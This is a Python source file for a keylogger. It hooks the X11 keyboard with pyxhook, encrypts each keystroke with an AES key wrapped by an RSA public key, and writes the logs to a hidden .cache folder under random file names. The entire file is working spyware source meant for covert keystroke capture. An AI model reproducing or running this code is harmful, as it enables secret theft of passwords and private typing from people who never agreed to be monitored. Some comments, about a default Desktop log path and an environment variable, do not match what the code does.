#!/usr/bin/env python
import os, sys, random
import pyxhook
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random

def log(message, verbose):
    if verbose:
        print(message)

verbose = True if os.environ.get('LOG_VERBOSE', 1) == 1 else False

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_dir = os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), '.cache')

log_file = os.path.join(log_dir, str(random.randint(0, 10000)).ljust(5, '0'))

log('[*] LOG_VERBOSE: 1', verbose)
log('[*] LOG_DIR: {}'.format(log_dir), verbose)


# create dirname if it doesn't exist
if not os.path.isdir(log_dir):
    try:
        os.mkdir(log_dir)
        log('[*] Created {}'.format(log_dir), verbose)
    except:
        log('[*] Error creating {}'.format(log_dir), verbose)
        log('[*] Exiting with error code 1', verbose)
        exit(1)

#Crypto-------------------------------------------------------------------------

with open('keys/key.pub', 'r') as f:
    public_key = RSA.importKey(f.read())
    log('[*] Loaded public key from keys/key.pub', verbose)

# create a random AES key
aes_key = Random.new().read(16)
iv = Random.new().read(AES.block_size)
aes_cipher = AES.new(aes_key, AES.MODE_CFB, iv)
log('[*] Generated random {} byte AES key'.format(len(aes_key)), verbose)

# encrypt that random AES key with the public key 
encrypted_aes_key = public_key.encrypt(aes_key, "")[0]
log('[*] AES key encrypted using public key', verbose)

aes_key_filename = '{}_aes'.format(log_file)
with open(aes_key_filename, 'wb') as f:
    f.write(encrypted_aes_key)
    log('[*] Saved encrypted AES key to {}'.format(aes_key_filename), verbose)

with open(log_file, 'w') as f:
    f.write(iv)
    log('[*] Wrote AES initialization vector to {}'.format(log_file), verbose)

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write(aes_cipher.encrypt('{}\n'.format(event.Key)))

hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress
hook.HookKeyboard()

try:
    hook.start()
    log('[*] Saving encrypted keystrokes to {}'.format(log_file), verbose)
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
